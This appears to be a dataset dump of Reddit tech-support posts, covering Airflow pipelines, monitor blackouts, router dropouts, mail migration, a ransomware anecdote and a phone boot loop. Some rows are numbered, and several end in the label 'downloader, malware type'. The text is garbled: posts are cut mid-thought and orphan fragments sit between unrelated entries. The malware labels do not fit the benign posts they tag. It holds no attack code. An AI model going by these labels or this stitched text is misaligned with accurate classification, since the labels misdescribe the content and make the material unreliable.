Nevertheless, it is a pipeline, with about 10 stages, and I thought Airflow would be a good way of managing it. The idea of defining a DAG for each type of stream, defining which steps need to occur (some in sequence, some concurrent, etc), dispatching tasks as they come up, and monitoring the pipeline is basically what I'm looking for, and Airflow seems to be very good for this.

But there are several concerns I have about Airflow and I'm wondering if these are easily addressed, or if there might be a different orchestrator that would be better.

1. It seems Airflow is really designed to be cron on steroids. That is, it's designed for static jobs that are run on a set schedule. But my pipeline doesn't run on a schedule. It's triggered each time a new video is available. So sometimes there could be no jobs, and sometimes there could be a hundred videos that need to be processed. Does Airflow do well with these sorts of unscheduled jobs and would I run into any scalability issues if, at peak times, it needs to orchestrate several thousand videos all in various stages of the pipeline?
2. Regarding static jobs, how static do jobs or DAGs need to be? While for probably 90% of our videos, the DAG would be fairly static (would need to pass a few parameters to specify which video to process), some videos require more dynamic DAGs, where based on a preliminary analysis of the video, a DAG would be created for that specific video. Does Airflow support truly dynamic, one-time DAGs, where we could essentially write a custom DAG for each video at the first step of processing and then have Airflow manage it from there (and then cleanup the DAG once the video is done)? Like I mentioned, we don't need this sort of fully dynamic feature right now, but it would be nice to have for future needs.
3. How flexible is error and failure mode handling? While half of our errors can be fixed by simply restarting the step, the other half require looking at the actual error and re-routing to a different step or DAG entirely. For example, if a specific AI model finds no detections, the video might need to be sent to an entirely different pipeline with a different set of models / tasks, and then rejoin at the output phase to create the final clips.

So those are my main concerns. I guess the tl;dr version is, how flexible / dynamic are Airflow DAGs in practice? Can we write them to make decisions mid-pipeline about which path to go down (i.e. due to an error, or other conditions)? At the extreme, is it easy to write a completely custom DAG for each job? Or is there a better orchestrator to do this?

I play Valorant and during peak hours my ping is usually 40-50 to my closest server (Georgia) and my absolute best ping in game can sometimes drop to below 30, barely, about 28-29ms late at night.

I know people here have talked about FME and Python automating this and being able to have it automatically join the Assessing Database to my polygon layer and create the new shapefile.  

Once again, im sorry if that makes 0 sense.  I am looking to further my education and I don't understand the back end of GIS at all and am looking for helpful advice or a nudge in the right direction.  Or just general comments on my current workflow.

Just built my pc and everything is working fine except for the fact that the monitor will randomly go black and say ""DisplayPort No Signal."" Sometimes the screen will come back on after a few seconds but other times I have to restart my PC for it to display again. The worst is when I restart and get the Aorus intro for a few seconds and then it goes to black again. That's happened about 2 or 3 times and each time I had to restart 3 times to get it to work. Also key to note that this has only happened when I am on the Windows home screen with some apps running in the background, like it's never happened while I was gaming or anything like that. For example, it happened several times while I was downloading games, when the GPU was idle. I have the latest graphics drivers installed and I have checked the DP connection at both ends, so those should not be problems. Right now, I am thinking it is either an issue with the wire itself or something to do with the fact that I am running HDR along with 4K and 144Hz. The monitor I am using is capable of 144Hz at 4K, but it doesn't specifically mention HDR. Any info, help, or advice would be greatly appreciated, thanks. If you need any other info, please ask me.

1071,"Something related to Windows Search and Edge WebView keeps causing large report-dump files to appear, threatening to clog up my hard-drive. Dear u/Daddy_Spez 

This seems to be something that recently started happening, and I discovered it fully yesterday when I booted up my computer and found that I suddenly had only 20 GBs left - and it was slowly draining from there.

After rebooting the computer and running a disk check during the startup, then downloading a program to help me track down the space-hog, I discovered it was stemming from a folder burrowed in the AppData section, and further details reveal that it has something to do with the WebView program running and trying to involve SearchApp.exe, only to crash.

The folder URL is ""C:\Users(user name withheld)\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\EBWebView\Crashpad\reports""

Whenever this crashing happens, it causes a cluster of report files to pop up in that folder, of varying inconsistent sizes, that rack up to 500MBs per crash. I've been keeping a close eye on that folder, deleting the files whenever I notice them, but I have no clue how to get it to permanently stop, short of uninstalling one of either WebView or the Search App, which I feel like I probably shouldn't do for the sake of my computer's health.

* mobo: Z790-P wifi

Other times, when I try to do a regular shutdown for the PC, it would start the shutdown process, close all apps, screen goes black, and then I feel it would freeze again right before switching off, because the PC would keep running. I would see the internal components lit, all fans still running, and I'd be waiting for it to turn off but it won't

The PC is still relatively clean with barely any softwares installed, but honestly I'm thinking of doing a reset and removing everything if nothing works out.

Yesterday I updated the BIOS of the mobo, and even downloaded some drivers for it to see if it would fix the issue, but it crashed again today as I was playing a game.

1085,"My Galaxy S21 doesn't auto-update every app. I own a Samsung S21 currently running OneUI 5.1, though thay doesn't really matter since I've been having this issue since at least OneUI 4.

Google Play's auto-update works fine on the most recently used apps. They're listed in the Update list, and they are automatically updated.

My issue lays in other apps I use less often but still need them to work whenever I must use them. It's annoying and even problematic when I go to an app, like a License plate searcher app, to fill in Insurance data on a form after a car accident, or to look up my airline app to get my next flight data I booked months prior, or even a McDonald's app that I go to only once every other while, only to get a screen, generally made by the developers themselves (and not a generic Android screen), that says ""You need to update this app in order to work with latest features"".
In most of these situations, the screen cannot be bypassed. I need to fetch the app update _manually_ and waste 5-10min waiting for it to install (for some reason, app installations on Android, or at least Samsung, are in my experience way slower than on iOS; downloads are generally fast), then potentially another 10min just to login (yes 10min, these apps are generally not well developed and have various hoops and hurdles to jump through in order to do a simple login).
This behavior is not ideal, particularly in a hurry.

I found out that, in order to have them show up in the updates list, I need to have launched the app recently. I don't even know how recent. That's BS to me. I want *all* of my apps updated ASAP.

1087,"Home Internet Router loses internet connection when my son downloads games (Part 2). Dear u/daddy_spez

*TL;DR - My son downloads games and it kills my internet modem/router and all devices in the house lose connection.*

About a month ago, I [posted](https://www.reddit.com/r/techsupport/comments/13viyr9/home_internet_router_loses_internet_connection/) here because when my son downloads large games over WiFi, our router dies and the whole house loses internet. This is a follow-up with further information as I'm still having the issue.

Background:

* Living in Australia
* ISP is Optus
* Unlimited downloads at 100MB/s download, 20MB/s upload
* Modem/Router is ISP-supplied and is [this one](https://www.optus.com.au/connected/news/optus-launches-next-gen-ultra-wifi-modem).
* In Australia, broadband infrastructure is supplied by [NBN](https://www.nbnco.com.au/).
* My connection is HFC. My NTD looks like [this](https://www.nbnco.com.au/learn/network-technology/hybrid-fibre-coaxial-explained-hfc-3/_jcr_content/root/container_1179805434/container_444786375/accordion_5287531153/item_8443037080/columncontrol_4535915396/col1/image_4167626284.coreimg.jpeg/1616543061839/nbn-connection-box-hfc-front.jpeg).
* Devices connected to wifi are two Windows 11 machines, one Windows 10 laptop, various iOS devices.
* LG TV is connected to LAN directly into the router.
* Wifi has both 2.4GHz and 5.0GHz bands. My son is using the 2.4GHz as he is further from the router.

I have been getting intermittent dropouts with my modem/router and it seems to occur when:

* My son downloads a large game (50GB), but can drop out after 1-3 GB. Yesterday, it failed on a file smaller than 1GB. Games can be downloaded from sites such as Steam or Epic Games, possibly others. 
* My son logs in to his computer (there may be something happening at startup), though this isn't always the case.

I am now on my 3rd replacement modem from Optus. They have sent a technician who was baffled by this. He phoned a friend, who also had no idea. Although, his friend said he was able to remotely look at my modem. The modem was showing that it had between 150-200 MAC addresses. I asked the technician if he meant that there were between 150-200 devices connected to the modem. He said, ""No, the device itself is showing that it has that many."" They couldn't explain that.

When the Optus technician was here, we connected my old modem/router and got the same dropout behaviour.

When the Optus technician was out of ideas, he blamed it on the NBN. So, a couple of days later, an NBN technician came. He replaced the NTD and claimed that the issue was resolved. Before I let him leave, I asked my son to download a game. Sure enough, the modem dropped out. The NBN technician said that they'd have to do work in the ""pit"" in the street. I do not think anything has happened yet with that.

I have also extracted logs generated from the modem. If I go to the part of the log prior to it restarting (when I unplug/plug it in), I can see the following (MAC addresses obfuscated):

`29.05.2023 5:27:21 warning DHCPC WAN DHCP client (1) stopped`

`29.05.2023 5:27:23 info SYS The fixed wan disconnected`

`29.05.2023 5:27:23 info LTE SIM card plug out`

`29.05.2023 5:27:29 info WETH WAN Ethernet connectivity has been established`

`29.05.2023 5:27:29 info DHCPC WAN DHCP client (1) started`

`29.05.2023 5:27:34 info WIFI Device <XX:XX:XX:XX:XX:XX> was disconnected on SSID (Device/WiFi/SSIDs/SSID[WLAN_2_4])`

another log showed similar but slightly different errors:

`29.05.2023 5:27:21 warning DHCPC WAN DHCP client (1) stopped`

`29.05.2023 5:27:23 info SYS The fixed wan disconnected`

`29.05.2023 5:27:23 info LTE SIM card plug out`

`29.05.2023 5:27:29 info WETH WAN Ethernet connectivity has been established`

`29.05.2023 5:27:29 info DHCPC WAN DHCP client (1) started`

`29.05.2023 5:27:34 info WIFI Device <XX:XX:XX:XX:XX:XX> was disconnected on SSID (Device/WiFi/SSIDs/SSID[WLAN_2_4])`

The Optus technician didn't even bother with the logs. I don't think he knew what to do with them. The common thing before failure seems to be the message: WAN DHCP client (1) failed.

Meanwhile, I have attempted to download large files on my laptop. I generated a 50GB file on this [website](https://testfiledownload.com/)and it downloaded fine.

This indicates that perhaps there is an issue with my son's computer that is causing the modem/router to crash, however, I haven't really heard of anything that would cause this. We have done a full scan in Windows Defender, and it detected nothing. I have also updated network drivers.

Is it possible that there is something on the computer that could be causing the crash? Some malware that isn't getting detected by Defender? Some other software? Torrent software?

1117,"Google Workspace to Microsoft 365 Mail Migration. G'day r/sysadmins,I've just received a request from a client for a Google Workspace to Microsoft 365 Mail migration with 35 active users. 

I haven't done a Google Workspace to Microsoft 365 Mail migration before so I'm unsure on what to expect.They currently have an Microsoft 365 tenancy and are using the onmicrosoft.com domain to grant them access to the Office 365 desktop suite via Business Basic. 

We are going to be purchasing Microsoft Business Premium for the current users but unsure of the implications of per-exisiting users on the 365 tenancy.

I've read through dozen of Microsoft articles and resources on the internet and I'm starting to plan out the steps involved in getting the mail data across to the Microsoft 365 tenancy. The steps I'm thinking of following are:

&#x200B;

1. Verify the primary domain name in Microsoft 365 and adding the TXT files to the DNS records in order to verify.
2. Creating a sub-domian in Google Workspace as an Alies Domain and update TXT records ie. m365.domainname.com.au
3. Adding a sub-domain in Microsoft 365 admin and update the TXT records ie. gsuite.domainname.com.au
4. Create a mail user under Contacts in Microsoft 365 Admin and adding the external address for the sub domain gsuite.domainname.com.au and setting the domain as domainname.com.au.
5. Add a SMTP proxy address to m365.domainname.com.au
6. Assign the users the Business Premium license
7. Create a migration batch under Exchange Online
8. Select the Google Workspace Migration under Migration Type
9. Sign into the Google Admin account for Automating the Google Workspace configuration and complete the process of downloading the .json file it provides and copying the client ID and scope from EAC to clicking authorize
10. Creating the Migration End-Point in M365 and in Google Workspace (Importing the .json file into Gmail Migration Config page)
11. Importing CSV file that contains the information of the users I need to migrate into M365
12. Save the migration batch and allow the migration to finishThese steps were formulated by various different articles in conjunction with Microsoft's documentation on Google Workspace to M365.

Are these steps the correct way to go about it without using a tool such as MigrationWiz? 

Should I be doing things differently and are there any gotcha's I should be on the look out for prior to migrating?

Hello sorry if this seems like a vent but I have to get it off my chest to feel better, last year I got hit by a ransomware attack that caused me great anxiety. When I got it I looked everywhere about it on the internet and never found anything resembling the ransom letter I got. 


It's started when one day I suddenly got logged out of windows while playing a game. I got back in and ran malwarebytes but it didn't find anything. The next day I opened my pc and went to get breakfast, I came back to seeing it logged out again but this time when I opened it I saw CMD open with the title (444.exe). I immediately ran malwarebytes again and it still didn't find anything, so I went and tried other scanners such as hitman pro that also didn't find anything. I saw a thread about running rootkit scanning on malwarebytes and it finally found something. 


I made sure windows defender was on and even got a malwarebytes subscription just in case something else happens and went out to get lunch. I come back to see windows logged out Again. But this time all my files got encrypted, malwarebytes got uninstalled and that's how I found the ransom note. 


I decided to factory reset, but also fresh installed windows from USB. Almost a year later nothing suspicious has happened yet but as I'm getting close to the anniversary I'm feeling more and more anxious. 


Things to note, I was in an internship that had me build a simple game on Unity with multiplayer using Photon engine. Other than that, I had downloaded a couple of mods from nexusmods that are deemed safe by them. And the following link is closest thing I've found to any semblance of info about the 444.exe file I have https://www.greatis.com/appdata/d/_/444.exe.htm

\- Destroys link after first click

links that are essentially like this:

My Lightsail instance is not optimized for this compute intensive workload.

1136,"Organizing Wi-Fi network, using or disabling ISP router?. So, I just bought an Archer BE800 from TP-Link, and I need some advice, since my companies' network guys have divided opinions regarding this and I am not that decided what's the best.

Two options:

1. Disable completely my ISPs Wi-Fi network and using the 5 Gbps ethernet port to connect to the BE800, and then, connecting every single Wi-Fi device to it, (around 12 devices + 20 IoT and SmartHome devices), dividing them between a regular Wi-Fi network and a secondary, special IoT 2.4 GHz network, just to keep everything neat. In this scenario, I'd have the BE800 configured as a router and have all the functions available, (QoS, for example).

2. Leaving only my 2.4 GHz network on my ISPs router and leave that network as IoT-dedicated network, and using BE800s network only for high-bandwidth devices, (I usually stream 4K content and download large files). BE800 would be configured to act as a access point rather than a router and lose some functions.

I am inclined for the second option. My logic on that is that the BE800 router will be fully available for these high-bandwidth devices and since it has less devices connected to it, performance will be better than if I leave all the work to a single router. 

But, please, from an IT perspective, please let me know what's the most efficient and elegant solution, (I know those two might not come together into a single solution).",downloader,malware type

I've never addressed a user directly in a post before but it was in the rules so I tried, this is what Google said is the right way, sorry if I did it wrong..) 

I have an issue with downloading music and was wondering if anyone had any ideas. I've been downloading a bunch of songs from YouTube via a website my mom recommend. most of the songs download just fine. But there are more than 20 that download as a 1kb unreadable file. I've tried downloading it again, different videos of the same song, different links. But they still refuse to download correctly. Someone else said to delete all the broken ones and try again, that also didn't work. It still came up as a 1kb file with no music. There's no pattern to which ones break, as far as I'm aware. Just every few songs there'll be one or two that don't download right. I find it odd that it still won't download different versions and different videos of the same songs. It's a different link, it should still work. But it doesn't. And it isn't an issue with storage space, that's been suggested before, there are other songs that download correctly after the broken one with no issues. Some of these songs have been successfully downloaded on my old phone, but I can't download them on my laptop or my new phone no matter what version or link I use. So it's not an issue with the song, or any one particular video. And it's not my computer or the website I used to download cus I get the same issue on my phone and other videos have been downloaded just fine. 

I hope I've followed all the rules correctly,and I hope I have enough information. If you need more info or if I've done something wrong, let me know in the comments and I'll try to fix it!

1142,"Dear Linux users please stop.... # ~Introduction~

Hi there Linux community this is gonna be a lengthy post and I'm sorry about that but I really need to type this out because I'm so sick and tired of being treated like a pinata just because I'm new to Linux and I ask questions or if heavens forbid that I compare something in Linux to Windows.

# ~The Community~

The Linux community has had the worst people I had displeasure of interacting with ever and that is really saying something considering how internet is. Now for context because I have tried using Linux many times before (trying different distros) and I would always run into problems and so I would take it to the internet in search for an answer. More often than not I would be met with no solutions at all to my specific problem(s) and/or the solution is too complex for me to understand so  I would often found myself asking questions in the r/linuxquestions and r/linux4noobs only to be met with hostile responses, down votes, trolling, no comments and/or people making fun out of me **for trying to learn how it works**. Also if dare to mention Windows anywhere or make a comparison you'll get bombarded with nasty comments left, right and center. In what fantasy land are you guys living in where you think that everyone would know everything about Linux right off the bat? The reason to why Linux has grown so much over the past few years is because people are coming over from Windows so why the hostility towards Windows users in general? I see these types of comments on a daily basis from multiple platforms:

[...](https://preview.redd.it/x1sjudhl50ab1.png?width=750&format=png&auto=webp&v=enabled&s=d36c586872f17316eeef2d1073b07fe3ea47e6a3)

[I'm not defending anything here but this is just immature behavior.](https://preview.redd.it/viqqdrvm50ab1.png?width=740&format=png&auto=webp&v=enabled&s=1120b569533ad5c4ab94eb018f8c0ad85e65a732)

Are you really that simple-minded and immature, to have to go out of your way and post crap like this? You're literally shunning away people from using the software that you love and by doing that you are also blowing away chances for a better market where Linux can shine even more. Actions speaks for itself and if you want change, then YOU need to change. Now, if you want to tell me that I'm the only one that's saying this or that I have been ""unlucky"" with meeting people like that, then I urge you to head on over to YouTube and check out ""Linus Tech Tips"" channel and search for ""Daily Driver Challenge"" and take a look at the average Joe (me included) trying to run Linux without knowing anything prior and learning as you go. Talking about his experiences with Linux something that I can fully relate to. And it's not me, it's you.

# ~Windows vs. Linux~

The hardest defender I have heard/read for Linux is that it is open-source and doesn't steal any data. While the open-source part is 100% true, the argument that it's not stealing data is completely false. **Everything** in this world takes/steals data for various reasons; to check compatibility issues with drivers and/or programs and to be able to provide you with security updates just to name something and it's not just computers doing it either - games and consoles does the same thing. This has been going on since the mid 2000's and if you want to be as accurate as possible here then Linux is the reason to why. Linux isn't as innocent as you might think and I urge you to do some research here before you call me a heathen or think that my post is blasphemous for even toying with the idea. But to tackle the quote on quote ""spyware"" that Windows 10/11 has, you could either get the program called: 'ShutUp10' for Windows 10 or a program called: 'ThisIsWin11' for Windows 11 to debloat the system and to get rid off most the ""spyware"" that it might have, it's not hard if you do a little research and would you look at that, it only took around 10 seconds to find. 

Now I understand that Linux support is growing so more and more people are chiming in to make it easier for someone like me to find a certain problem, be able to troubleshoot it and then ultimately fix it, all while understanding everything I just did and to be able to repeat it, if need be. However I still have that problem of not wanting to post my question, either because of backlash I get or people trying to trick me to download something I don't understand which in turn will brick my OS (which has happened BTW). Linux isn't as easy as Linux users think it is. There are problems with both Linux and Windows and anyone that tries to advocate that either of them are better are just stupid and in denial because both has their uses. There are both pros and cons to using either OS and people that are trying to switch over to Linux or in other words *'getting their feet wet'* are still gonna use Windows and have Linux launched in a VM (Virtual Machine) until they are comfortable enough to do the leap over, that's just the reality of it. But making that jump is harder than one would think because again if the person get bombarded with negativity and general immature behavior, then guess what, either that user will leave by either going back to Windows or they will go Mac while cursing out the Linux community because you lack the respect and seemingly the social intelligence to help people when they need it. Again I will point out that you want people to change over to Linux because that's a huge win for everyone, the market share will grow the market value will grow, more companies would want to look into Linux and make games and programs that work natively on Linux etc. etc. and only morons wouldn't understand or want that.

# ~Final words~

Linux is amazing in its own right and I had a ton of fun playing around with all the different distros and whatnot but as time as proven time and time again, whenever something happens and I ask for help there is always that ""special"" someone that just hates you for no reason and want to show off how pathetic he/she really is by trying to ruin your day and to you I say it's time to grow up and bite into the sour apple that we call life and just like Mutahar from 'SomeOrdinaryGamers' would say: *""if you have problem with this, then go out and touch some grass.""*",downloader,malware type

1. Display a menu with the department names and ask your user to select a department.
2. Read an N integer from the input. This integer represents the maximum number of students that this department will accept.
3. Use the web service API to download the data file into your python program:

\-Keep only the students that have the chosen department (from step 1) as their first choice.
4. Use pandas to create a data frame using these data.  
\- Update all missing values for admission exam scores to 0.  
\- Create a new column with the mean score of all exams.  
\- Create a new column to choose the best score for a student in the ranking: either the mean score for the final exam(s) or the special exam's score, whichever is higher.
5. Create a text file called: DepartmentNameAcceptedStudents.csv with the department name, the accepted student names, and the student's best score, either the mean finals score or the special exam score.
6. Create a meaningful plot

So I currently pay for speeds up to 800mbps, pre-Nighthawk my download speeds were 80down/16up with no game lag that I could recall but with the Nighthawk I get 500-600down/23up. I had the Nighthawk hook up and running without a single problem for like a week and then halfway through a day of gaming I got hit with all this lag and buffering issues out of nowhere. 

I've called Xfinity and trying to explain game lag to them is like talking to a brick wall and they just ask if I can load a web page which I can and it's not a problem, the problem is all the latency issues I have. 

I've tried all I can think of and I've asked some buddies who are more knowledgeable than myself and I've tried the following:

*Tried setting up port forwarding
*Replaced Cat6 cables even though they're new

I'm at a loss, I've got a tech coming the morning of the 7/6 and I'm hoping they can fix it then but I'd hate to have to use their equipment again.

I come from a Fortinet background, but have used Barracuda to prepare for my exams in previous years. Currently i have the task to take a json file from the interweb, extract a certain portion of ip addresses and get them into one of Barracuda's 4 CustomExternalObjects.

**Technicalities:**

* Hardware: Barracuda F82 Annex-B Revision A
* Firmware: 9.0.0-0511
* License status: Unlicensed, DEMO mode

**Achievements so far:**

* Writing a python3 script that downloads a json file with ip addresses from the web (script can be provided if someone finds it useful)
* Parsing the json and getting rid of duplicates
* Writing the final IP list to a file with one CIDR entry in each line

**Where i fail:**

* Using /var/phion/bin/CustomExternalAddrImport to import those CIDR IPs into the CustomExternalObject
* The command runs without errors (no message in linux is usually a good message)

I'm trying to transfer a video to my Windows 10 PC, but it seems to arrive partially corrupted despite different methods. The video file plays, but parts of the video have messy and distorted pixels.

I tried transferring the file via a couple of options: OneDrive and DropBox. For DropBox, I tried downloading multiple methods: Chrome and Edge browers, as well as the DropBox folder in Finder. Finally to make sure it wasn't an issue with the video player app, I tried viewing the video in several different players: Media Player, ""Films & TV"", ""Photos"", and even VLC. The video is always corrupted in the same places.

The file looks fine on other devices, a Macbook and an Android phone. So it seems like it would have to be an issue with my PC, not the original file itself or the file transfer services or the download or playback apps.

Edit: I also downloaded the file to my PC, renamed it, reuploaded it to OneDrive and downloaded it to my MacBook. The video seems normal there. So it's not that my PC is breaking the file itself.",downloader,malware type

1162,"AWS Lambda/API Gateway - Best way to approach creating an ANY method??. Hi, I'm having some trouble getting my ANY method to work with my API in python 3.10. I am a newbie with AWS, so my apologies in advance. I am working pretty much entirely within Lambda to write my code.

I've tried to make it so that it can handle GET, POST, PUT, and DELETE through POSTMAN. The way I've handled it in Lambda was to assign event.get('httpMethod') to a variable and use it to determine which section of my code to ""activate"" using a series of ""if"" statements (if chosenmethod == ""GET"":, etc.) 


It worked fine like this until I tried adding the code for my POST to it.
My code for post generates a presigned-url that the user can use to upload a file, and I have it as a separate Lambda function atm and it works when it's in its own function. My obstacle is that when I try to put it into my ANY function using copy+paste under the ""if method == ""POST"":"" section, my whole api just  breaks and only returns 403 or 500 errors. I think it's because my POST function normally takes in GET as the httpMethod to return the presigned-upload-url and I guess it is conflicting with my original GET function that retrieves an object and returns it as a downloadable in a presigned url.

Since my GET and POST both seem to share a need for the GET httpMethod, is there a better approach I can do to help my code differentiate without breaking?? Usually I get 502 Bad Gateway or a 403 Forbidden returned when I use POSTMAN.

1163,"Dying Light 2 Manual Re-BAR ON vs OFF Benchmarks. Greetings everyone. I wanted to post my Dying Light 2 Stay Human in-game benchmark results with Resizable BAR ON vs OFF. I'm actually talking about the manual toggle for the game's profile in NVIDIA Profile Inspector, and not the one that's enabled from the motherboard's BIOS.

I also wanted to ask those of you that own the game with an Ampere or Ada GPU to check if they can replicate my results, which are the following:

\- Manual Re-BAR OFF:

https://preview.redd.it/xne7039dyu9b1.jpg?width=2560&format=pjpg&auto=webp&v=enabled&s=bfb931986fbc6a28396188049959e2a728a7715d

As you guys can see, the frames rendered/median FPS figures are about 6-7% higher with manual Re-BAR ON, which IMO is a non-negligible margin. I am seeing similar figures during actual gameplay as well but actual results can vary depending on your hardware.

&#x200B;

For those who don't know how to enable manual Re-BAR for a certain game driver profile, the steps to follow are:1 - Download NVIDIA Profile Inspector from here: [https://github.com/Orbmu2k/nvidiaProfileInspector/releases/download/2.4.0.4/nvidiaProfileInspector.zip](https://github.com/Orbmu2k/nvidiaProfileInspector/releases/download/2.4.0.4/nvidiaProfileInspector.zip)

2 - Select the ""Dying Light 2 Stay Human"" driver profile by typing the game name:

I wanted to start taking part in watchalongs but you can't watch two things at once on android, which is a bummer. I didn't own a PC, so I asked some family if they had an old PC/laptop they didn't need anymore and they gave me a 5-ish year old laptop that runs windows 10.


It turns on without issue, the fans are really loud, always on full blast and it's always boiling hot. All it has to do is play two videos at once, so I don't mind too much.


I set everything up, hit play on both videos and I noticed that every 2-4 seconds the audio and video on both sources stuttered in sync every time. It didn't fix itself even after the laptop had been on for hours.


I thought it might be an internet thing, so I plugged in an ethernet cable but that didn't fix it. I tried playing a downloaded video and saw the same problem there too.


I'm not sure what to do here, is the laptop too old to use anymore? Alternatively, if anyone knows of a way to skip the laptop entirely and just use my android phone (Pixel 2 xl) that would be ideal. VLC doesn't have that capability on Android atm and viewsync(dot)net only works with YouTube videos.

I am unsure of how to download this dataset. I am a novice at advanced computer things so I did some googling and first I tried using FileZilla. I couldn't get it to work - I'm unsure if it didn't work because I'm doing it wrong or if it's the wrong program to use. 
  
Then I tried using command line using wget. It almost worked, but it threw an error that mentioned that I need a login. The website does mention that you may need a login: ""Satellite data products may require a NASA Earthdata Login username and password.""  I am new to advanced computer things, so I'm not sure how to enter the login in command line using wget.  
  
So, I have a few questions. I assume that the data is downloadable in tiles by region - but there isn't an indication which file is associated with which region. Why isn't that information included on the webpage? How do I know what to download, then? I don't need the data for the entire planet, just for a specific area. So, because it's not clear what file is associated with what region, I thought i'd just have to download all the files because it's not clear which file I need. But even then, how do I even download this data? Command line? FileZilla? Manually?? Do you know of another dataset similar to this one that is more easily downloadable?

1189,"How do I fix packet loss?. Over the past two years my internet started to become slower and started noticing more packet loss and ping spikes most commonly while playing games online or watching streamed media.

I live in a house with 8 other individuals, three of which use ethernet cables on their PCs, and one smart TV connected via ethernet, and one console also connected to ethernet. The rest are connected usually over wifi on their personal mobile devices.

I have a fiberoptic plan with 500mb up/download package, using an **EchoLife HG8245Q** router by Huawei (provided initially by my ISP).

My download and upload speeds on my PC range from 60-90 Mbps depending on the time of day, ping usually around 4 ms (local towers).

I, a lowly sysadmin, humbly beseech you for information on a Cisco issue I have been having.  Please see fit to provide the information you may have to help me.

I've been tasked with updating the firmware of 5 Cisco 9200L-48 switches in the education lab I'm in charge of.  The firmware file I received worked fine on the first three, but the last two are saying that the calculated md5 hash doesn't match the embedded md5 hash, and so they won't use it.  I've tried with both 17.6.5 and 17.9.3.  (I tried the 17.9.3 first, because it was what I was given, and after that didn't work, I thought to ask for the 17.6.5 as an intermediate step.)  I've tried multiple downloads of each, but keep getting the same error.

Now, not being a habitual Cisco person, I've been using the web gui to do these updates.  I am well aware more netadmins prefer to use the cli, but I am just not good at the Cisco cli, so I avoid it.  If there is something in the cli that I can use rather than the web gui, I'm willing to try it.  I just don't know enough about the cli to know what to try right now.  

As for going to my corporate net admins, they are overloaded, and don't respond to tickets for months, so I can't really do much there.  I'd rather not uselessly add to their workload, with them in that situation.  So, any help for me would be helping them.  ",downloader,malware type
1199,"The Nightmare PC Build - GPU Failure Leading to Blackscreen Crashes. Dear u/daddy_spez

I apologize up front, there is going to be A LOT of info dump here to give the full background on what has happened and what I have done so far to try and troubleshoot and find the cause of the issue. I've been toying around reading forums and watching videos for the better part of 3 weeks and am at my limit here, my last hope is that some crowd sourcing of the brains can help. I want you all to know everything in case at any point, it is obvious that what I did was wrong or if I should have or can do anything else to further identify the issue.

  
So a few months ago, I was looking to build a new PC after years of limping through low fps gaming at 1440p. I decided to splurge this time and go all out to hopefully last for the next 5+ years. I ended up getting going for: AMD 7950X3D CPU, Asus Strix X670E-E motherboard, Gskill 64GB 6000MHz RAM, Asus Strix 4090 GPU, and a Corsair 1500i Power Supply. I ended up deciding to go water cooled for temps and place in a large case for air flow. After the parts came in is when I started hearing reports of GPU power melting and CPU burning for the parts and held off for a month while reading reports and watching for fixes. After a month, I got a cablemod 90degree adapter and updated the Bios to the latest 1416 bios for the voltage limit fix and assembled the PC.

  
While building I was sure to vertical mount the GPU and have the power adapter fully seated with no gap or wiggle room for pulling out. I then ran a straight line from the adapter out the back of the case and zip tied it to ensure no wiggle or tension would be imparted back onto the GPU.

  
The computer was then fully built and I set a lower temp throttle on the CPU at 85C and undervolted it to a stable run condition with stress tests showing no instability. All temps read fine with GPU reaching max temp of 58C and CPU reaching max temp of 81C under heavy load. The system worked great and had amazing performance and was cool on the temps during my normal gaming and productivity work. Besides the EXPO settings in the RAM for the rated 6000MHz, no overclocking or manual increasing in voltages or power was performed.

  
Fast forward a month and my computer black screens out of nowhere and attempts to reboot  are met with no response. I take apart the PC and notice the GPU is flashing the red lights for low power. After draining the loop and pulling the GPU out, I notice the power adapter connector is melted despite pulling a max wattage of 380W during any of my use sessions (3070Ti is pulling 300W currently for reference). I swap the GPU for a 3070Ti and re-fill and power back up which then works and gets me to the windows login. After logging in after about 15minutes, the system blackscreens and I get a Code15 ""memory initialization"" error on the motherboard. This happens repeatedly despite turning off the EXPO and replacing it with a new RAM kit. The light alternates between the CPU light and the DRAM light. I run a memtestx86 and it completes a full pass no failures after an hour and 15 minute run. I decide to replace the power supply with a new one to see if the card may have shorted and the overcurrent protection failed in the PSU resulting in issues. This allowed for a boot and the system to run for much longer including a few games, but still with the occasional crash. I decided to reduce the undervolting a bit and try again, this time it appeared stable and only crashed once in 3 days when downloading a new game. This is where I currently stand where it works, but can crash at any moment without notice or any clear fail  point/condition.  
I am working to RMA the GPU, but with these occasional crashes, I am trying to figure out if there may be other issues that resulted from when the card went down. The new power supply helped, but didn't fix it entirely. I am unsure of any other ways to datalog or test if my CPU or MB may have been damaged from the initial crash.  I am hoping someone may have had a similar case or know of a way for me to further dig into my issue.

I'll try to make this concise, but I run an in-person D&D campaign during which I like to play my laptop's audio out of two bluetooth speakers (different model, same brand) simultaneously. Because one is an Anker Soundcore and the other is an Anker Soundcore 2, they cannot pair directly, and on my old laptop I could use a program called Voicemeeter in order to turn one audio output into two as long as both speakers were paired to the laptop. The program was really finnicky and there were a few times where I struggled to get it working, but when it did, it was fairly reliable. 

I recently upgraded my laptop - I had an Acer Nitro 5 AN515-54, and needed to get a new one (a Nitro 5 AN515-58) due to a power surge frying the old one. Checking the specs, I see that my old laptop had Bluetooth 5.0 capabilities, while the new one has ""Bluetooth 5.1 and above."" 

In trying to recreate my old setup on the new laptop, I found that I could not for the life of me get Voicemeeter to play audio out of both speakers (even though both were paired), only ever one at a time while it refused to recognize the other. I'm unsure what differences in the laptops' bluetooth drivers or adapters would account for this difficulty, considering it worked decently on an older model of the same computer.

In case it was an issue with the program installation being different or something like that, I also tried downloading Virtual Audio Cable and running two parallel instances to each speaker that way. However I was only ever able to activate one instance and not the other, which would return an error message. This happening with both Voicemeeter and VAC tells me that it could be some kind of hardware or driver limitation which only allows audio to be sent to one external device at a time. It's also worth noting that with both programs, I'm able to make the built-in laptop speakers play audio at the same time as one of the bluetooth speakers, just never both bluetooth speakers at once.

If there is a need for any more information regarding the specifications of my laptop or the speakers themselves, I would be happy to send it over!

1206,"Samsung A325G (A-326U) Still Stuck in Boot Loop After Successful Odin Flash. To make a long story short, I'm attempting to re-flash my Dad's Samsung A32 5G after he received a virus via a text message. Shortly after opening the text message his phone shut off and has been stuck in a boot loop ever since. We have attempted to let the battery on the device die completely, but this appears to have no effect.  
  
The only menu that is accessible on the the device is download mode. I'm using Odin v3.14.1 to flash the device to get it back to factory settings, as it is not possible to access the menu to do a factory reset on the device itself. My computer recognizes the device when it's connected in download mode and the drivers were installed successfully.  
  
